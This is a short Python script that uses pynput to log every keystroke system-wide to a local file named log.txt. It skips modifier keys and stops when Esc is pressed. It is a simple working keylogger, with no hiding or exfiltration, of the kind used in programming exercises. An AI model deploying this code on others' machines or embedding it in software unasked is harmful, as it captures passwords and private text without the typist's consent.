from pynput import keyboard

# List of keys to ignore
ignore_keys = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.backspace
}

def write_to_file(key):
    keydata = ''

    if key in ignore_keys:
        return  # Ignore these keys completely

    # Handle character keys
    if hasattr(key, 'char') and key.char is not None:
        keydata = key.char
    else:
        if key == keyboard.Key.space:
            keydata = ' '
        elif key == keyboard.Key.enter:
            keydata = '\n'
        elif key == keyboard.Key.tab:
            keydata = '\t'
        elif key == keyboard.Key.esc:
            return False  # Stop listener
        else:
            return  # Ignore all other special keys

    with open("log.txt", "a") as file:
        file.write(keydata)

with keyboard.Listener(on_press=write_to_file) as l:
    l.join()
